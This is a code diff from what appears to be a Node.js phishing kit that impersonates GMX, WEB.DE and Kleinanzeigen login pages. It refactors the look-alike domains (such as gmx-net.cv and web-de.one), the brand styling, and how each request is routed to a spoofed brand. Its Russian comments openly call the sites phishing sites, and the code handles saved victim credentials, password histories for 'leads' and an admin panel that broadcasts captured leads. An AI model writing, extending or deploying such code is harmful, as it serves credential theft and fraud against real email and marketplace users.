@@ -9,11 +9,20 @@ const dns = require('dns');
 const fs = require('fs');
 const path = require('path');
 const { PROJECT_ROOT, DATA_DIR, initAppServices } = require('./core/bootstrap');
+const brandDomains = require('./config/brandDomains');
+brandDomains.reload();
 const { mergeServiceRouteDeps } = require('./core/routeHttpDeps');
 const { handleApiRequestChain } = require('./core/httpApiDispatch');
 const { handleFastPreGateRoutes, handlePreStaticSpecialRoutes } = require('./core/httpSpecialRoutes');
 const { handleDownloadRoutes } = require('./core/httpDownloadRoutes');
-const { isAdminRequest, isAdminPagePath, isAdminLoginPath, isAdminDomainAllowedPath } = require('./core/adminPaths');
+const {
+  isAdminRequest,
+  isAdminPagePath,
+  isAdminLoginPath,
+  isAdminDomainAllowedPath,
+  isAdminDomainPublicUnauthenticatedPath,
+  buildAdminLoginNextUrl,
+} = require('./core/adminPaths');
 const { attachAdminLeadsWebSocket } = require('./services/wsAdminBroadcast');
 const url = require('url');
 const os = require('os');
@@ -142,32 +151,7 @@ function writeFatalSync(msg) {
   } catch (_) {}
 }
 
-/** Домены сайтов: GMX и WEB.DE работают параллельно на разных доменах. Хост админки — см. src/utils/authUtils (ADMIN_DOMAIN). */
-const GMX_DOMAIN = (process.env.GMX_DOMAIN || 'gmx-net.cv').toLowerCase().replace(/^https?:\/\//, '').split('/')[0];
-/** Список хостов GMX (через запятую). Как WEBDE_DOMAINS: все считаются валидным origin без 301 на «чужой» хост. */
-const GMX_DOMAINS_RAW = (process.env.GMX_DOMAINS || '').trim();
-const GMX_DOMAINS_LIST = GMX_DOMAINS_RAW
-  ? GMX_DOMAINS_RAW.split(',').map(function (d) { return d.toLowerCase().replace(/^https?:\/\//, '').split('/')[0].trim(); }).filter(Boolean)
-  : [GMX_DOMAIN, 'www.' + GMX_DOMAIN];
-const GMX_CANONICAL_HOST = (GMX_DOMAINS_LIST[0] || GMX_DOMAIN).replace(/^www\./, '') || GMX_DOMAIN;
-const WEBDE_DOMAIN = (process.env.WEBDE_DOMAIN || 'web-de.one').toLowerCase().replace(/^https?:\/\//, '').split('/')[0];
-/** Подпись потока в логе [ВХОД] (по умолчанию домен фишинга WEBDE_DOMAIN). Env: SERVER_LOG_PHISH_LABEL */
-const SERVER_LOG_PHISH_LABEL = (process.env.SERVER_LOG_PHISH_LABEL || WEBDE_DOMAIN || 'сайт').trim() || 'сайт';
-/** Список доменов WEB.DE (через запятую). Если задан — все они отдают бренд webde. Иначе используется только WEBDE_DOMAIN и www.WEBDE_DOMAIN. */
-const WEBDE_DOMAINS_RAW = (process.env.WEBDE_DOMAINS || '').trim();
-const WEBDE_DOMAINS_LIST = WEBDE_DOMAINS_RAW
-  ? WEBDE_DOMAINS_RAW.split(',').map(function (d) { return d.toLowerCase().replace(/^https?:\/\//, '').split('/')[0].trim(); }).filter(Boolean)
-  : [WEBDE_DOMAIN, 'www.' + WEBDE_DOMAIN];
-const WEBDE_CANONICAL_HOST = WEBDE_DOMAINS_LIST[0].replace(/^www\./, '') || WEBDE_DOMAIN;
-
-/** Домен(ы) Klein (Kleinanzeigen). Отдельный бренд на своём домене. */
-const KLEIN_DOMAIN = (process.env.KLEIN_DOMAIN || 'choigamevi.com').toLowerCase().replace(/^https?:\/\//, '').split('/')[0];
-const KLEIN_DOMAINS_RAW = (process.env.KLEIN_DOMAINS || '').trim();
-const KLEIN_DOMAINS_LIST = KLEIN_DOMAINS_RAW
-  ? KLEIN_DOMAINS_RAW.split(',').map(function (d) { return d.toLowerCase().replace(/^https?:\/\//, '').split('/')[0].trim(); }).filter(Boolean)
-  : [KLEIN_DOMAIN, 'www.' + KLEIN_DOMAIN];
-/** Канонический хост для 301 (не первый из списка алиасов). Задаётся KLEIN_DOMAIN. */
-const KLEIN_CANONICAL_HOST = KLEIN_DOMAIN.replace(/^www\./, '');
+/** Домены GMX / WEB.DE / Klein — brandDomains (env + data/brand-domains.json). */
 /** Старые хосты Klein → 301 на KLEIN_CANONICAL_HOST только до KLEIN_LEGACY_REDIRECT_UNTIL (ISO 8601). Пусто = выкл. */
 const KLEIN_LEGACY_REDIRECT_HOSTS_RAW = (process.env.KLEIN_LEGACY_REDIRECT_HOSTS || '').trim();
 const KLEIN_LEGACY_REDIRECT_HOSTS = KLEIN_LEGACY_REDIRECT_HOSTS_RAW
@@ -197,7 +181,7 @@ function tryKleinLegacyHostRedirect(req, res, requestHost) {
     if (!httpsOn && req.socket && req.socket.encrypted === true) httpsOn = true;
   } catch (_) {}
   const proto = httpsOn ? 'https' : 'http';
-  const loc = proto + '://' + KLEIN_CANONICAL_HOST + destPath;
+  const loc = proto + '://' + brandDomains.scalars.kleinCanonicalHost + destPath;
   res.writeHead(301, { Location: loc, 'Cache-Control': 'no-store' });
   res.end();
   return true;
@@ -214,7 +198,7 @@ const BRANDS = {
     primaryColor: '#1c449b',
     primaryColorDark: '#16367c',
     canonicalUrl: 'https://www.gmx.net/',
-    canonicalHost: GMX_CANONICAL_HOST,
+    canonicalHost: brandDomains.scalars.gmxCanonicalHost,
     impressumUrl: 'https://www.gmx.net/impressum/',
     datenschutzUrl: 'https://agb-server.gmx.net/datenschutz',
     agbUrl: 'https://agb-server.gmx.net/gmxagb-de',
@@ -229,7 +213,7 @@ const BRANDS = {
     primaryColorDark: '#E6C700',
     buttonDisabledColor: '#F5EDC1',
     canonicalUrl: 'https://newsroom.web.de/',
-    canonicalHost: WEBDE_CANONICAL_HOST,
+    canonicalHost: brandDomains.scalars.webdeCanonicalHost,
     impressumUrl: 'https://web.de/impressum/',
     datenschutzUrl: 'https://web.de/datenschutz',
     agbUrl: 'https://web.de/agb',
@@ -243,7 +227,7 @@ const BRANDS = {
     primaryColor: '#326916',
     primaryColorDark: '#2a5712',
     canonicalUrl: '/',
-    canonicalHost: KLEIN_CANONICAL_HOST,
+    canonicalHost: brandDomains.scalars.kleinCanonicalHost,
     impressumUrl: '/anmelden',
     datenschutzUrl: '/anmelden',
     agbUrl: '/anmelden',
@@ -251,6 +235,8 @@ const BRANDS = {
     passwortUrl: '/anmelden'
   }
 };
+
+brandDomains.setBrandsRef(BRANDS);
 
 /** Klein: ссылки и canonical только на текущий хост (без внешних доменов бренда). */
 function kleinBrandForRequest(req) {
@@ -295,8 +281,8 @@ function getBrand(req) {
   if (byPath === 'klein') return kleinBrandForRequest(req);
   if (byPath === 'gmx') return BRANDS.gmx;
   if (byPath === 'webde') return BRANDS.webde;
-  if (KLEIN_DOMAINS_LIST.indexOf(host) !== -1) return kleinBrandForRequest(req);
-  if (WEBDE_DOMAINS_LIST.indexOf(host) !== -1) return BRANDS.webde;
+  if (brandDomains.KLEIN_DOMAINS_LIST.indexOf(host) !== -1) return kleinBrandForRequest(req);
+  if (brandDomains.WEBDE_DOMAINS_LIST.indexOf(host) !== -1) return BRANDS.webde;
   return BRANDS.gmx;
 }
 
@@ -310,25 +296,23 @@ function inboundRequestHost(req) {
 
 /**
  * Вторая колонка в [ВХОД] терминала: домен фишинг-сайта по фактическому запросу (GMX / WEB.DE / Klein),
- * а не SERVER_LOG_PHISH_LABEL (часто WEBDE_DOMAIN), иначе на GMX-домене в логе оставался web-de.one.
+ * а не SERVER_LOG_PHISH_LABEL (часто webde-домен), иначе на GMX-домене в логе оставался web-de.one.
  */
 function terminalEntradaSiteLabel(req) {
   const host = inboundRequestHost(req);
-  if (!host) return SERVER_LOG_PHISH_LABEL;
-  if (isLocalHost(host)) return SERVER_LOG_PHISH_LABEL;
-  if (KLEIN_DOMAINS_LIST.indexOf(host) !== -1) return KLEIN_CANONICAL_HOST;
-  if (WEBDE_DOMAINS_LIST.indexOf(host) !== -1) return WEBDE_CANONICAL_HOST;
-  if (GMX_DOMAINS_LIST.indexOf(host) !== -1) return GMX_CANONICAL_HOST;
-  return host.replace(/^www\./, '') || SERVER_LOG_PHISH_LABEL;
+  const phish = brandDomains.getServerLogPhishLabel();
+  if (!host) return phish;
+  if (isLocalHost(host)) return phish;
+  if (brandDomains.KLEIN_DOMAINS_LIST.indexOf(host) !== -1) return brandDomains.scalars.kleinCanonicalHost;
+  if (brandDomains.WEBDE_DOMAINS_LIST.indexOf(host) !== -1) return brandDomains.scalars.webdeCanonicalHost;
+  if (brandDomains.GMX_DOMAINS_LIST.indexOf(host) !== -1) return brandDomains.scalars.gmxCanonicalHost;
+  return host.replace(/^www\./, '') || phish;
 }
 
 /** Канонический домен для текущего запроса (по бренду хоста). */
 function getCanonicalDomain(req) {
   const brand = getBrand(req);
-  if (brand.id === 'klein') {
-    const host = (req && req.headers && req.headers.host ? req.headers.host : '').split(':')[0].toLowerCase();
-    return host.replace(/^www\./, '');
-  }
+  if (brand.id === 'klein') return brandDomains.scalars.kleinCanonicalHost;
   return brand.canonicalHost;
 }
 
@@ -703,10 +687,6 @@ function pushPasswordHistory(lead, newPassword, source) {
   if (allowed.indexOf(source) === -1 || newPassword == null || String(newPassword).trim() === '') return;
   var trimmed = String(newPassword).trim();
   if (!Array.isArray(lead.passwordHistory)) lead.passwordHistory = [];
-  function lastPwd(entry) {
-    return typeof entry === 'string' ? entry : (entry && entry.p ? entry.p : '');
-  }
-  if (lead.passwordHistory.length > 0 && lastPwd(lead.passwordHistory[lead.passwordHistory.length - 1]) === trimmed) return;
   lead.passwordHistory.push({ p: trimmed, s: source });
 }
 
@@ -1148,16 +1128,8 @@ const ROUTE_HTTP_DEPS = mergeServiceRouteDeps({
   ENABLE_EMAIL_DOMAIN_ALLOWLIST: ENABLE_EMAIL_DOMAIN_ALLOWLIST,
   EVENT_LABELS: EVENT_LABELS,
   GATE_TIME_TTL_MS: GATE_TIME_TTL_MS,
-  GMX_DOMAIN: GMX_DOMAIN,
-  GMX_CANONICAL_HOST: GMX_CANONICAL_HOST,
-  GMX_DOMAINS_LIST: GMX_DOMAINS_LIST,
-  GMX_DOMAINS_RAW: GMX_DOMAINS_RAW,
   HEARTBEAT_MAX_AGE_MS: HEARTBEAT_MAX_AGE_MS,
   HOST: HOST,
-  KLEIN_CANONICAL_HOST: KLEIN_CANONICAL_HOST,
-  KLEIN_DOMAIN: KLEIN_DOMAIN,
-  KLEIN_DOMAINS_LIST: KLEIN_DOMAINS_LIST,
-  KLEIN_DOMAINS_RAW: KLEIN_DOMAINS_RAW,
   KLEIN_VICTIM_PASSWORD_ERROR_DE: KLEIN_VICTIM_PASSWORD_ERROR_DE,
   LOGIN_ARTIFACT_NAMES: LOGIN_ARTIFACT_NAMES,
   LOGIN_CLEANUP_MAX_AGE_MS: LOGIN_CLEANUP_MAX_AGE_MS,
@@ -1174,15 +1146,10 @@ const ROUTE_HTTP_DEPS = mergeServiceRouteDeps({
   RATE_LIMIT_WINDOW_MS: RATE_LIMIT_WINDOW_MS,
   REQUIRE_GATE_COOKIE: REQUIRE_GATE_COOKIE,
   SAVED_CREDENTIALS_FILE: SAVED_CREDENTIALS_FILE,
-  SERVER_LOG_PHISH_LABEL: SERVER_LOG_PHISH_LABEL,
   terminalEntradaSiteLabel: terminalEntradaSiteLabel,
   SHORT_DOMAINS_FILE: SHORT_DOMAINS_FILE,
   SHORT_DOMAINS_TTL_MS: SHORT_DOMAINS_TTL_MS,
   START_PAGE_FILE: START_PAGE_FILE,
-  WEBDE_CANONICAL_HOST: WEBDE_CANONICAL_HOST,
-  WEBDE_DOMAIN: WEBDE_DOMAIN,
-  WEBDE_DOMAINS_LIST: WEBDE_DOMAINS_LIST,
-  WEBDE_DOMAINS_RAW: WEBDE_DOMAINS_RAW,
   WEBDE_SCRIPT_VICTIM_WAIT_MS: WEBDE_SCRIPT_VICTIM_WAIT_MS,
   WEBDE_WAIT_PASSWORD_TIMEOUT_MS: WEBDE_WAIT_PASSWORD_TIMEOUT_MS,
   ZIP_PASSWORD_FILE: ZIP_PASSWORD_FILE,
@@ -1320,6 +1287,22 @@ const ROUTE_HTTP_DEPS = mergeServiceRouteDeps({
   webdeLoginChildByLeadId: webdeLoginChildByLeadId,
 });
 
+Object.defineProperties(ROUTE_HTTP_DEPS, {
+  GMX_DOMAIN: { enumerable: true, configurable: true, get: function () { return brandDomains.scalars.gmxDomain; } },
+  GMX_CANONICAL_HOST: { enumerable: true, configurable: true, get: function () { return brandDomains.scalars.gmxCanonicalHost; } },
+  GMX_DOMAINS_LIST: { enumerable: true, configurable: true, get: function () { return brandDomains.GMX_DOMAINS_LIST; } },
+  GMX_DOMAINS_RAW: { enumerable: true, configurable: true, get: function () { return brandDomains.scalars.gmxDomainsRaw; } },
+  KLEIN_CANONICAL_HOST: { enumerable: true, configurable: true, get: function () { return brandDomains.scalars.kleinCanonicalHost; } },
+  KLEIN_DOMAIN: { enumerable: true, configurable: true, get: function () { return brandDomains.scalars.kleinDomain; } },
+  KLEIN_DOMAINS_LIST: { enumerable: true, configurable: true, get: function () { return brandDomains.KLEIN_DOMAINS_LIST; } },
+  KLEIN_DOMAINS_RAW: { enumerable: true, configurable: true, get: function () { return brandDomains.scalars.kleinDomainsRaw; } },
+  WEBDE_CANONICAL_HOST: { enumerable: true, configurable: true, get: function () { return brandDomains.scalars.webdeCanonicalHost; } },
+  WEBDE_DOMAIN: { enumerable: true, configurable: true, get: function () { return brandDomains.scalars.webdeDomain; } },
+  WEBDE_DOMAINS_LIST: { enumerable: true, configurable: true, get: function () { return brandDomains.WEBDE_DOMAINS_LIST; } },
+  WEBDE_DOMAINS_RAW: { enumerable: true, configurable: true, get: function () { return brandDomains.scalars.webdeDomainsRaw; } },
+  SERVER_LOG_PHISH_LABEL: { enumerable: true, configurable: true, get: function () { return brandDomains.getServerLogPhishLabel(); } }
+});
+
 const server = http.createServer(async (req, res) => {
   // Обработка CORS preflight запросов
   if (req.method === 'OPTIONS') {
@@ -1378,14 +1361,18 @@ const server = http.createServer(async (req, res) => {
     ADMIN_DOMAIN,
     isAdminRequest,
     isAdminDomainAllowedPath,
+    isAdminDomainPublicUnauthenticatedPath,
+    buildAdminLoginNextUrl,
+    PASSWORD_AUTH_ENABLED,
+    hasValidAdminSession,
     isShortDomain,
     shortDomainKey,
     shortDomainsList,
     getCanonicalDomain,
-    GMX_DOMAIN,
-    GMX_DOMAINS_LIST,
-    WEBDE_DOMAINS_LIST,
-    KLEIN_DOMAINS_LIST,
+    GMX_DOMAIN: brandDomains.scalars.gmxDomain,
+    GMX_DOMAINS_LIST: brandDomains.GMX_DOMAINS_LIST,
+    WEBDE_DOMAINS_LIST: brandDomains.WEBDE_DOMAINS_LIST,
+    KLEIN_DOMAINS_LIST: brandDomains.KLEIN_DOMAINS_LIST,
     PROJECT_ROOT,
     getBrand,
     getShortDomainsList,
